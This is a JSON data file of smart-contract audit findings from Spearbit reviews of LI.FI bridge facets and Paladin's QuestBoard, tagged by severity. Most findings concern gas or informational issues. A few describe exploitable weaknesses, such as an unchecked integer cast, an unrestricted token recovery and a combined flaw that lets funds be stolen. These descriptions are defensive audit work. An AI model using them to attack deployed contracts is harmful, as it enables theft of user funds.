        "body": "The issue with the code is that it performs an unsafe cast from a uint256 value to a uint128 value in the call to initiateTeleport() function. The _bridgeData.minAmount parameter passed to this function is of type uint256, but it is cast to uint128 without any checks, which may result in a loss of precision or even an overflow. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { LibAsset.maxApproveERC20( IERC20(dai), address(teleportGateway), _bridgeData.minAmount ); teleportGateway.initiateTeleport( l1Domain, _bridgeData.receiver, uint128(_bridgeData.minAmount) + );",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cache s.anyTokenAddresses[_bridgeData.sendingAssetId]",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of MultichainFacet contains the following expresssion. This retrieves the value for s.anyTokenAddresses[_bridgeData.sendingAssetId] twice. It might save some gas to first store this in a tmp variable. s.anyTokenAddresses[_bridgeData.sendingAssetId] != address(0) ? ,! s.anyTokenAddresses[_bridgeData.sendingAssetId]: ...",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "DeBridgeFacet permit seems unusable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function deBridgeGate.send() takes a parameter permit. This can only be used if it's signed by the Diamond, see DeBridgeGate.sol#L654-L662. As there is no code to let the Diamond sign a permit, this function doesn't seem usable. function _startBridge(...) ... { ... deBridgeGate.send{ value: nativeAssetAmount }(..., _deBridgeData.permit, ...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant checks in CircleBridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaCircleBridge() contains both noNativeAsset() and onlyAllowSourceToken(). The check noNativeAsset() is not necessary as onlyAllowSourceToken() already verifies the sendingAssetId isn't a native token. 22 function swapAndStartBridgeTokensViaCircleBridge(...) ... { ... noNativeAsset(_bridgeData) onlyAllowSourceToken(_bridgeData, usdc) { ... } modifier noNativeAsset(ILiFi.BridgeData memory _bridgeData) { if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { revert NativeAssetNotSupported(); } _; } modifier onlyAllowSourceToken(ILiFi.BridgeData memory _bridgeData, address _token) { if (_bridgeData.sendingAssetId != _token) { revert InvalidSendingToken(); } _; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant check on _swapData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "This check is not present in the majority of the facets if (_swapData.length == 0) { revert NoSwapDataProvided(); } Ultimately, it's not required as _depositAndSwap() reverts when length is 0.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicate checks done",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In highlighted cases, a check has been done multiple times at different places:  validateBridgeData modifier on ArbitrumBridgeFacet. _startBridge() does checks already done by functions from which it's called.  depositAsset() does some checks already done by AmarokFacet.startBridgeTokensViaAmarok().",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "calldata can be used instead of memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "When the incoming argument is constant, calldata can be used instead of memory to save gas on copying it to memory. This remains true for individual array elements.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Further gas optimizations for HopFacetOptimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "For the contract HopFacetOptimized it is very important to be gas optimized. Especially on Arbritrum, it is relatively expensive due to the calldata. 24 struct HopData { uint256 bonderFee; uint256 amountOutMin; uint256 deadline; uint256 destinationAmountOutMin; uint256 destinationDeadline; IHopBridge hopBridge; } struct BridgeData { bytes32 transactionId; string bridge; string integrator; address referrer; address sendingAssetId; address receiver; uint256 minAmount; uint256 destinationChainId; bool hasSourceSwaps; bool hasDestinationCall; } function startBridgeTokensViaHopL1ERC20( ILiFi.BridgeData calldata _bridgeData, HopData calldata _hopData ) external { // Deposit assets LibAsset.transferFromERC20(...); _hopData.hopBridge.sendToL2(...); emit LiFiTransferStarted(_bridgeData); } function transferFromERC20(...) ... { if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); if (to == NULL_ADDRESS) revert NoTransferToNullAddress(); IERC20 asset = IERC20(assetId); uint256 prevBalance = asset.balanceOf(to); SafeERC20.safeTransferFrom(asset, from, to, amount); if (asset.balanceOf(to) - prevBalance != amount) revert InvalidAmount(); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "payable keyword can be removed for some bridge functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "For the above highlighted functions, the native token is never forwarded to the underlying bridge. In these cases, payable keyword and related modifier refundExcessNative(payable(msg.sender)) can be re- moved to save gas.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "AmarokData.callTo can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "AmarokFacet's final receiver can be different from _bridgeData.receiver address receiver = _bridgeData.hasDestinationCall ? _amarokData.callTo : _bridgeData.receiver; Since both _amarokData.callTo and _bridgeData.receiver are passed by the caller, AmarokData.callTo can be removed, and _bridgeData.receiver can be assumed as the final receiver.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use requiredEther variable instead of adding twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The cost and nativeAmount are added twice to calculate the requiredEther variable, which can lead to increased gas consumption.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "refundExcessNative modifier can be gas-optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The highlighted code above can be gas-optimized by removing 1 if condition.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "BridgeData.hasSourceSwaps can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The field hasSourceSwaps can be removed from the struct BridgeData. _swapData is enough to identify if source swaps are needed.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary validation argument for native token amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Since both msg.value and feeAmount is controlled by the caller, you can remove feeAmount as an argument and assume msg.value is what needs to be collected. This will save gas on comparing these two values and refunding the extra.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Restrict access for cBridge refunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "cBridge refunds need to be triggered from the contract that sent the transaction to cBridge. This can be done using the executeCallAndWithdraw function. As the function is not cBridge specific it can do any calls for the Diamond contract. Restricting what that function can call would allow more secure automation of refunds.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Stargate now supports multiple pools for the same token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Stargate protocol now supports multiple pools for the same token on the same chain, each pool may be connected to one or many other chains. It is not possible to store a one-to-one token-to-pool mapping.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Expose receiver in GenericSwapFacet facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Other than the bridge facets the swap facet does not emit the receiver of a transaction yet.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Track the destination chain on ServiceFeeCollector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "ServiceFeeCollector collects gas fees to send to the destination chain. For example /// @param receiver The address to send gas to on the destination chain function collectTokenGasFees( address tokenAddress, uint256 feeAmount, address receiver ) However, the destination chain is never tracked in the contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Executor can reuse SwapperV2 functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Executor.sol's noLeftOvers and _fetchBalances() is copied from SwapperV2.sol.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding onERC1155Received",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In addition to ERC721, NFTs can be created using ERC1155 standard. Since, the use case of purchasing an NFT has to be supported, support for ERC1155 tokens can be added.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "SquidFacet uses a different string encoding library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "SquidFacet uses an OZ library to convert address to string, whereas the underlying bridge uses a different library. Fuzzing showed that these implementations are equivalent.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Assembly in StargateFacet can be replaced with Solidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function toBytes() contains assembly code that can also be replaced with solidity code. Also, see how-to-convert-an-address-to-bytes-in-solidity. 30 function toBytes(address _address) private pure returns (bytes memory) { bytes memory tempBytes; assembly { let m := mload(0x40) _address := and(_address,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) mstore(add(m, 20),xor(0x140000000000000000000000000000000000000000, _address) ) mstore(0x40, add(m, 52)) tempBytes := m } return tempBytes; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck quoteLayerZeroFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function quoteLayerZeroFee uses msg.sender to determine a fee, while _startBridge() uses _bridgeData.receiver to execute  router.swap. This might give different results. function quoteLayerZeroFee(...) ... { return router.quoteLayerZeroFee( ... , toBytes(msg.sender) ); } function _startBridge(...) ... router.swap{ value: _stargateData.lzFee }(..., toBytes(_bridgeData.receiver), ... ); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing modifier refundExcessNative()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaXDaiBridge() of GnosisBridgeFacet() and Gnosis- BridgeL2Facet() don't have the modifier refundExcessNative(). While other Facets have such a modifier.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Special case for cfUSDC tokens in CelerIMFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function startBridgeTokensViaCelerIM() has a special case for cfUSDC tokens, whereas swapAndStartBridgeTokensViaCelerIM() doesn't have this. function startBridgeTokensViaCelerIM(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { if (...) { // special case for cfUSDC token asset = IERC20(CelerToken(_bridgeData.sendingAssetId).canonical()); } else { ... } } ... } function swapAndStartBridgeTokensViaCelerIM(...) ... { ... if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { // no special case for cfUSDC token } ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "External calls of SquidFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions CallBridge and CallBridgeCall do random external calls. This is done via a sepa- rate contract multicall SquidMulticall. This might be used to try reentrancy attacks. function _startBridge(...) ... { ... squidRouter.bridgeCall{ value: msgValue }(...); ... squidRouter.callBridgeCall{ value: msgValue }(...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing test coverage for triggerRefund Function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current test suite does not include test cases for the triggerRefund function. This oversight may lead to undetected bugs or unexpected behavior in the function's implementation.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Implicit assumption in MakerTeleportFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of MakerTeleportFacet has the implicit assumption that dai is an ERC20 token. However on GnosisChain the native asset is (x)dai. Note: DAI on GnosisChain is an ERC20, so unlikely this would be a problem in practice. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { LibAsset.maxApproveERC20( IERC20(dai),...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Robust allowance handling in maxApproveERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Some tokens, like USDT, require setting the approval to 0 before setting it to another value. The function SafeERC20.safeIncreaseAllowance() doesn't do this. Luckily maxApproveERC20() sets the allowance so high that in practice this never has to be increased. function maxApproveERC20(...) ... { ... uint256 allowance = assetId.allowance(address(this), spender); if (allowance < amount) SafeERC20.safeIncreaseAllowance(IERC20(assetId), spender, MAX_UINT - allowance); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused re-entrancy guard",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The RelayerCelerIM.sol#L21 includes a redundant re-entrancy guard, which adds an extra layer of protection against re-entrancy attacks. While re-entrancy guards are crucial for securing contracts, this particular guard is not used.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant duplicate import in the LIFuelFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current LIFuelFacet.sol contains a redundant duplicate import. Identifying and removing dupli- cate imports can streamline the contract and improve maintainability.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extra checks in executeMessageWithTransfer()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function executeMessageWithTransfer() of RelayerCelerIM ignore the first parameter. seems this could be used to verify the origin of the transaction, which could be an extra security measure. It * @param * (unused) The address of the source app contract function executeMessageWithTransfer(address, ...) ... { }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable visibility is not uniform",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In the current facets, state variables like router/messenger visibilities are not uniform, with some variables declared as public while others are private. thorchainRouter => is defined as public. synapseRouter => is defined as public. deBridgeGate => is defined as private",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Library LibMappings not used everywhere",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The library LibMappings is used in several facets. However, it is not used in the following facets  ReentrancyGuard  AxelarFacet  HopFacet.sol  MultichainFacet  OptimismBridgeFacet  OwnershipFacet",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "transferERC20() doesn't have a null address check for receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "LibAsset.transferFromERC20() has a null address check on the receiver, but transferERC20() does not.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "LibBytes can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The following functions are not used  concat()  concatStorage()  equal()  equalStorage()  toBytes32()  toUint128()  toUint16()  toUint256()  toUint32()  toUint64()  toUint8()  toUint96() The call to function slice() for calldata arguments (as done in AxelarExecutor) can be replaced with the in-built slicing provided by Solidity. Refer to its documentation.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep generic errors in the GenericErrors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that some of the contracts are re-defined errors. The generic errors like a WithdrawFailed can be kept in the GenericErrors.sol",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Attention points for making the Diamond immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "There are additional attention points to decide upon when making the Diamond immutable: After removing the Owner, the following functions won't work anymore:  AccessManagerFacet.sol - setCanExecute()  AxelarFacet.sol - setChainName()  HopFacet.sol - registerBridge()  MultichainFacet.sol - updateAddressMappings() & registerRouters()  OptimismBridgeFacet.sol - registerOptimismBridge()  PeripheryRegistryFacet.sol - registerPeripheryContract()  StargateFacet.sol - setStargatePoolId() & setLayerZeroChainId()  WormholeFacet.sol - setWormholeChainId() & setWormholeChainIds() There is another authorization mechanism via LibAccess, which arranges access to the functions of  DexManagerFacet.sol  WithdrawFacet.sol Several Periphery contracts also have an Owner:  AxelarExecutor.sol  ERC20Proxy.sol  Executor.sol  FeeCollector.sol  Receiver.sol  RelayerCelerIM.sol  ServiceFeeCollector.sol Additionally ERC20Proxy has an authorization mechanism via authorizedCallers[]",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check on the final asset in _swapData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "MakerTeleportFacet verifies that the final received asset in _swapData is DAI. This check is not present in majority of the facets (including CircleBridgeFacet). Ideally, every facet should have the check that the final receivingAssetId is equal to sendingAssetId.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancies in pragma versioning across faucet implementations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The use of different pragma versions in facet implementations can present several implications, with potential risks and compliance concerns that need to be addressed to maintain robust and compliant contracts.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent use of validateDestinationCallFlag()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Highlighted code can be replaced with a call to validateDestinationCallFlag() function as done in other Facets.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent utilization of the isNativeAsset function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The isNativeAsset function is designed to distinguish native assets from other tokens within facet- based smart contract implementations. However, it has been observed that the usage of the isNativeAsset function is not consistent across various facets. Ensuring uniform application of this function is crucial for maintaining the accuracy and reliability of the asset identification and processing within the facets.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events/errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contracts contain several events and error messages that are not used anywhere in the contract code. These unused events and errors add unnecessary code to the contract, increasing its size.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make bridge parameters dynamic by keeping them as a parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current implementation has some bridge parameters hardcoded within the smart contract. This approach limits the flexibility of the contract and may cause issues in the future when upgrades or changes to the bridge parameters are required. It would be better to keep the bridge parameters as a parameter to make them dynamic and easily changeable in the future. HopFacetOptimized.sol => Relayer & RelayerFee MakerTeleportFacet.sol's => Operator person (or specified third party) responsible for initiating minting process on destination domain by providing (in the fast path) Oracle attestations.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The highlighted comment incorrectly refers USDC address as DAI address.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant console log",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contract includes Console.sol from test file, which is only used for debugging purposes. In- cluding it in the final version of the contract can increase the contract size and consume more gas, making it more expensive to deploy and execute.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "SquidFacet doesn't revert for incorrect routerType",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "If _squidData.routeType passed by the user doesn't match BridgeCall, CallBridge, or Call- BridgeCall, SquidFacet just takes the funds from the user and returns without calling the bridge. This, when the combined with the issue \"Max approval to any address is possible\", lets anyone steal those funds. Note: Solidity enum checks should prevent this issue, but it is safer to do an extra check.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Verify user has indeed voted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "If an error is made in the merkle trees (either by accident or on purpose) a user that did not vote (in that period for that gauge) might get rewards assigned to him. Although the Paladin documentation says: \"the Curve DAO contract does not offer a mapping of votes for each Gauge for each Period\", it might still be possible to verify that a user has voted if the account, gauge and period are known. Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens could be sent / withdrawn multiple times by accident",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Functions closeQuestPeriod() and closePartOfQuestPeriod() have similar functionality but in- terfere with each other. 1. Suppose you have closed the first quest of a period via closePartOfQuestPeriod(). Now you cannot use closeQuestPeriod() to close the rest of the periods, as closeQuestPeriod() checks the state of the first quest. 2. Suppose you have closed the second quest of a period via closePartOfQuestPeriod(), but closeQuest- Period() continues to work. It will close the second quest again and send the rewards of the second quest to the distributor, again. Also, function closeQuestPeriod() sets the withdrawableAmount value one more time, so the creator can do withdrawUnusedRewards() once more. Although both closeQuestPeriod() and closePartOfQuestPeriod() are authorized, the problems above could occur by accident. Additionally there is a lot of code duplication between closeQuestPeriod() and closePartOfQuestPeriod(), with a high risk of issues with future code changes. 5 function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... // We use the 1st QuestPeriod of this period to check it was not Closed uint256[] memory questsForPeriod = questsByPeriod[period]; require( ,! periodsByQuest[questsForPeriod[0]][period].currentState == PeriodState.ACTIVE, // only checks first period \"QuestBoard: Period already closed\" ); ... // no further checks on currentState _questPeriod.withdrawableAmount = .... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // sends tokens (again) ... } // sets withdrawableAmount (again) function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ,! ... _questPeriod.currentState = PeriodState.CLOSED; ... _questPeriod.withdrawableAmount = _questPeriod.rewardAmountPerPeriod - toDistributeAmount; IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); ... } Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Limit possibilities of recoverERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function recoverERC20() in contract MultiMerkleDistributor.sol allows the retrieval of all ERC20 tokens from the MultiMerkleDistributor.sol whereas the comment indicates it is only meant to retrieve those tokens that have been sent by mistake. Allowing to retrieve all tokens also enables the retrieval of legitimate ones. This way rewards cannot be collected anymore. It could be seen as allowing a rug pull by the project and should be avoided. In contrast, function recoverERC20() in contract QuestBoard.sol does prevent whitelisted tokens from being re- trieved. Note: The project could also add a merkle tree that allows for the retrieval of legitimate tokens to their own addresses. 6 * @notice Recovers ERC2O tokens sent by mistake to the contract contract MultiMerkleDistributor is Ownable { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; } } contract QuestBoard is Ownable, ReentrancyGuard { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Updating QuestBoard in MultiMerkleDistributor.sol will not work",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Updating QuestManager/ QuestBoard in MultiMerkleDistributor.sol will give the following issue: If the newQuestBoard uses the current implementation of QuestBoard.sol, it will start with questId == 0 again, thus attempting to overwrite previous quests. function updateQuestManager(address newQuestBoard) external onlyOwner { questBoard = newQuestBoard; }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Old quests can be extended via increaseQuestDuration()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function increaseQuestDuration() does not check if a quest is already in the past. Extending a quest from the past in duration is probably not useful. It also might require additional calls to closePartOfQuest- Period(). function increaseQuestDuration(...) ... { updatePeriod(); ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... uint256 periodIterator = ((lastPeriod + WEEK) / WEEK) * WEEK; ... for(uint256 i = 0; i < addedDuration;){ ... periodsByQuest[questID][periodIterator]....= ... periodIterator = ((periodIterator + WEEK) / WEEK) * WEEK; unchecked{ ++i; } } ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Accidental call of addQuest could block contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The addQuest() function uses an onlyAllowed access control modifier. This modifier checks if msg.sender is questBoard or owner. However, the QuestBoard.sol contract has a QuestID registration and a token whitelisting mechanism which should be used in combination with addQuest() function. If owner accidentally calls addQuest(), the QuestBoard.sol contract will not be able to call addQuest() for that questID. As soon as createQuest() tries to add that same questID the function will revert, becoming uncallable because nextID still maintains that same value. function createQuest(...) ... { ... uint256 newQuestID = nextID; nextID += 1; ... require(MultiMerkleDistributor(distributor).addQuest(newQuestID, rewardToken), \"QuestBoard: Fail add to Distributor\"); ... ,! } 8 function addQuest(uint256 questID, address token) external onlyAllowed returns(bool) { require(questRewardToken[questID] == address(0), \"MultiMerkle: Quest already listed\"); require(token != address(0), \"MultiMerkle: Incorrect reward token\"); // Add a new Quest using the QuestID, and list the reward token for that Quest questRewardToken[questID] = token; emit NewQuest(questID, token); return true; } Note: Set to medium risk because the likelihood 